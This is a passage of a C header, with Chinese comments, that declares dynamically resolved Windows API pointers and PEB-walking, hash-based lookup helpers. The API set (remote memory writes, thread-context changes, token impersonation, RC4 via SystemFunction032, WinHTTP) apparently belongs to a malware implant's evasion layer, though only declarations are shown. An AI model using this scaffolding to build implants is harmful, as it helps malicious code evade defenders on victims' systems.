typedef NTSTATUS(WINAPI *fnBCryptCreateHash)(BCRYPT_ALG_HANDLE, BCRYPT_HASH_HANDLE*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
typedef NTSTATUS(WINAPI *fnBCryptHashData)(BCRYPT_HASH_HANDLE, PUCHAR, ULONG, ULONG);
typedef NTSTATUS(WINAPI *fnBCryptFinishHash)(BCRYPT_HASH_HANDLE, PUCHAR, ULONG, ULONG);
typedef NTSTATUS(WINAPI *fnBCryptDestroyHash)(BCRYPT_HASH_HANDLE);
typedef NTSTATUS(WINAPI *fnBCryptGenRandom)(BCRYPT_ALG_HANDLE, PUCHAR, ULONG, ULONG);

/* winhttp */
typedef HINTERNET(WINAPI *fnWinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef HINTERNET(WINAPI *fnWinHttpConnect)(HINTERNET, LPCWSTR, INTERNET_PORT, DWORD);
typedef HINTERNET(WINAPI *fnWinHttpOpenRequest)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
typedef BOOL(WINAPI *fnWinHttpSendRequest)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
typedef BOOL(WINAPI *fnWinHttpReceiveResponse)(HINTERNET, LPVOID);
typedef BOOL(WINAPI *fnWinHttpQueryDataAvailable)(HINTERNET, LPDWORD);
typedef BOOL(WINAPI *fnWinHttpReadData)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL(WINAPI *fnWinHttpCloseHandle)(HINTERNET);
typedef BOOL(WINAPI *fnWinHttpSetOption)(HINTERNET, DWORD, LPVOID, DWORD);
typedef BOOL(WINAPI *fnWinHttpCrackUrl)(LPCWSTR, DWORD, DWORD, LPURL_COMPONENTS);
typedef BOOL(WINAPI *fnWinHttpQueryHeaders)(HINTERNET, DWORD, LPCWSTR, LPVOID, LPDWORD, LPDWORD);

/* ===== Win32Api 结构体 ===== */

typedef struct _Win32Api {
    /* kernel32 */
    fnCreateFileA pfnCreateFileA;
    fnCreateFileW pfnCreateFileW;
    fnReadFile pfnReadFile;
    fnWriteFile pfnWriteFile;
    fnCloseHandle pfnCloseHandle;
    fnDuplicateHandle pfnDuplicateHandle;
    fnGetFileSize pfnGetFileSize;
    fnCreateProcessW pfnCreateProcessW;
    fnInitializeProcThreadAttributeList pfnInitializeProcThreadAttributeList;
    fnUpdateProcThreadAttribute pfnUpdateProcThreadAttribute;
    fnDeleteProcThreadAttributeList pfnDeleteProcThreadAttributeList;
    fnOpenProcess pfnOpenProcess;
    fnTerminateProcess pfnTerminateProcess;
    fnVirtualAlloc pfnVirtualAlloc;
    fnVirtualFree pfnVirtualFree;
    fnVirtualProtect pfnVirtualProtect;
    fnCreateThread pfnCreateThread;
    fnCreateEventW pfnCreateEventW;
    fnSetEvent pfnSetEvent;
    fnCreateTimerQueue pfnCreateTimerQueue;
    fnCreateTimerQueueTimer pfnCreateTimerQueueTimer;
    fnDeleteTimerQueueEx pfnDeleteTimerQueueEx;
    fnCreateToolhelp32Snapshot pfnCreateToolhelp32Snapshot;
    fnProcess32FirstW pfnProcess32FirstW;
    fnProcess32NextW pfnProcess32NextW;
    fnGetModuleFileNameW pfnGetModuleFileNameW;
    fnQueryFullProcessImageNameW pfnQueryFullProcessImageNameW;
    fnIsWow64Process pfnIsWow64Process;
    fnGetNativeSystemInfo pfnGetNativeSystemInfo;
    fnMoveFileExW pfnMoveFileExW;
    fnCopyFileW pfnCopyFileW;
    fnDeleteFileW pfnDeleteFileW;
    fnCreateDirectoryW pfnCreateDirectoryW;
    fnRemoveDirectoryW pfnRemoveDirectoryW;
    fnFindFirstFileW pfnFindFirstFileW;
    fnFindNextFileW pfnFindNextFileW;
    fnFindClose pfnFindClose;
    fnGetFileAttributesW pfnGetFileAttributesW;
    fnSetFileAttributesW pfnSetFileAttributesW;
    fnGetFileTime pfnGetFileTime;
    fnSetFileTime pfnSetFileTime;
    fnGetCurrentDirectoryW pfnGetCurrentDirectoryW;
    fnSetCurrentDirectoryW pfnSetCurrentDirectoryW;
    fnProcessIdToSessionId pfnProcessIdToSessionId;
    fnGetTimeZoneInformation pfnGetTimeZoneInformation;
    fnFileTimeToLocalFileTime pfnFileTimeToLocalFileTime;
    fnFileTimeToSystemTime pfnFileTimeToSystemTime;
    fnSystemTimeToFileTime pfnSystemTimeToFileTime;
    fnLocalFileTimeToFileTime pfnLocalFileTimeToFileTime;
    fnGetComputerNameW pfnGetComputerNameW;
    fnGetUserNameW pfnGetUserNameW;
    fnGetSystemInfo pfnGetSystemInfo;
    fnSetHandleInformation pfnSetHandleInformation;
    fnCreatePipe pfnCreatePipe;
    fnGetStdHandle pfnGetStdHandle;
    fnWaitForSingleObject pfnWaitForSingleObject;
    fnWaitForMultipleObjects pfnWaitForMultipleObjects;
    fnGetExitCodeProcess pfnGetExitCodeProcess;
    fnFlushFileBuffers pfnFlushFileBuffers;
    fnSetEndOfFile pfnSetEndOfFile;
    fnSetFilePointerEx pfnSetFilePointerEx;
    fnGetFileSizeEx pfnGetFileSizeEx;
    fnHeapAlloc pfnHeapAlloc;
    fnHeapFree pfnHeapFree;
    fnHeapReAlloc pfnHeapReAlloc;
    fnGetProcessHeap pfnGetProcessHeap;
    fnGetCurrentProcess pfnGetCurrentProcess;
    fnGetCurrentProcessId pfnGetCurrentProcessId;
    fnGetCurrentThread pfnGetCurrentThread;
    fnGetCurrentThreadId pfnGetCurrentThreadId;
    fnSleep pfnSleep;
    fnGetTickCount64 pfnGetTickCount64;
    fnGetSystemTimeAsFileTime pfnGetSystemTimeAsFileTime;
    fnOutputDebugStringA pfnOutputDebugStringA;
    fnGetLastError pfnGetLastError;
    fnSetLastError pfnSetLastError;
    fnMultiByteToWideChar pfnMultiByteToWideChar;
    fnWideCharToMultiByte pfnWideCharToMultiByte;
    fnGetACP pfnGetACP;
    fnGetOEMCP pfnGetOEMCP;
    fnGetConsoleCP pfnGetConsoleCP;
    fnGetCommandLineW pfnGetCommandLineW;
    fnLoadLibraryW pfnLoadLibraryW;
    fnLoadLibraryA pfnLoadLibraryA;
    fnGetProcAddress pfnGetProcAddress;
    fnFreeLibrary pfnFreeLibrary;
    fnGetModuleHandleW pfnGetModuleHandleW;
    fnGetModuleHandleA pfnGetModuleHandleA;

    /* ntdll */
    fnRtlGetVersion pfnRtlGetVersion;
    fnNtQueryInformationProcess pfnNtQueryInformationProcess;
    fnNtQuerySystemInformation pfnNtQuerySystemInformation;
    fnRtlInitUnicodeString pfnRtlInitUnicodeString;
    fnNtClose pfnNtClose;
    fnLdrLoadDll pfnLdrLoadDll;
    fnNtCreateThreadEx pfnNtCreateThreadEx;
    fnNtGetContextThread pfnNtGetContextThread;
    fnNtSetContextThread pfnNtSetContextThread;
    fnNtResumeThread pfnNtResumeThread;
    fnNtWaitForSingleObject pfnNtWaitForSingleObject;
    fnNtTerminateThread pfnNtTerminateThread;
    fnNtAllocateVirtualMemory pfnNtAllocateVirtualMemory;
    fnNtProtectVirtualMemory pfnNtProtectVirtualMemory;
    fnNtWriteVirtualMemory pfnNtWriteVirtualMemory;
    fnNtOpenProcess pfnNtOpenProcess;
    fnLdrGetProcedureAddress pfnLdrGetProcedureAddress;
    fnRtlExitUserThread pfnRtlExitUserThread;
    fnRtlAddVectoredExceptionHandler pfnRtlAddVectoredExceptionHandler;
    fnRtlRemoveVectoredExceptionHandler pfnRtlRemoveVectoredExceptionHandler;
    fnRtlCaptureContext pfnRtlCaptureContext;
    fnNtContinue pfnNtContinue;
    fnRtlCreateTimerQueue pfnRtlCreateTimerQueue;
    fnRtlCreateTimer pfnRtlCreateTimer;
    fnRtlDeleteTimerQueue pfnRtlDeleteTimerQueue;
    fnRtlRegisterWait pfnRtlRegisterWait;
    fnRtlDeregisterWait pfnRtlDeregisterWait;
    ULONG_PTR ulTpReleaseCleanupGroupMembers;

    /* advapi32 */
    fnOpenProcessToken pfnOpenProcessToken;
    fnGetTokenInformation pfnGetTokenInformation;
    fnDuplicateTokenEx pfnDuplicateTokenEx;
    fnImpersonateLoggedOnUser pfnImpersonateLoggedOnUser;
    fnRevertToSelf pfnRevertToSelf;
    fnLookupAccountSidW pfnLookupAccountSidW;
    fnRegOpenKeyExW pfnRegOpenKeyExW;
    fnRegQueryValueExW pfnRegQueryValueExW;
    fnRegCloseKey pfnRegCloseKey;
    fnCryptAcquireContextW pfnCryptAcquireContextW;
    fnCryptReleaseContext pfnCryptReleaseContext;
    fnCryptGenRandom pfnCryptGenRandom;
    fnSystemFunction032 pfnSystemFunction032;

    /* bcrypt */
    fnBCryptOpenAlgorithmProvider pfnBCryptOpenAlgorithmProvider;
    fnBCryptCloseAlgorithmProvider pfnBCryptCloseAlgorithmProvider;
    fnBCryptGetProperty pfnBCryptGetProperty;
    fnBCryptSetProperty pfnBCryptSetProperty;
    fnBCryptGenerateSymmetricKey pfnBCryptGenerateSymmetricKey;
    fnBCryptDestroyKey pfnBCryptDestroyKey;
    fnBCryptEncrypt pfnBCryptEncrypt;
    fnBCryptDecrypt pfnBCryptDecrypt;
    fnBCryptImportKey pfnBCryptImportKey;
    fnBCryptCreateHash pfnBCryptCreateHash;
    fnBCryptHashData pfnBCryptHashData;
    fnBCryptFinishHash pfnBCryptFinishHash;
    fnBCryptDestroyHash pfnBCryptDestroyHash;
    fnBCryptGenRandom pfnBCryptGenRandom;

    /* winhttp */
    fnWinHttpOpen pfnWinHttpOpen;
    fnWinHttpConnect pfnWinHttpConnect;
    fnWinHttpOpenRequest pfnWinHttpOpenRequest;
    fnWinHttpSendRequest pfnWinHttpSendRequest;
    fnWinHttpReceiveResponse pfnWinHttpReceiveResponse;
    fnWinHttpQueryDataAvailable pfnWinHttpQueryDataAvailable;
    fnWinHttpReadData pfnWinHttpReadData;
    fnWinHttpCloseHandle pfnWinHttpCloseHandle;
    fnWinHttpSetOption pfnWinHttpSetOption;
    fnWinHttpCrackUrl pfnWinHttpCrackUrl;
    fnWinHttpQueryHeaders pfnWinHttpQueryHeaders;
} Win32Api, *PWin32Api;

/* ===== 函数声明 ===== */

/* 初始化所有动态 API 函数指针。成功返回 TRUE。 */
BOOL Win32ApiInit(PWin32Api pApi);

/* 通过遍历 PEB InMemoryOrderModuleList 查找模块句柄，按字符串哈希匹配。 */
HMODULE GetModuleByPeb(DWORD dwModuleHash);

/* 通过解析 PE 导出目录查找函数地址，按字符串哈希匹配。 */
FARPROC GetApiAddressByHash(HMODULE hModule, DWORD dwModuleHash, DWORD dwFunctionHash);
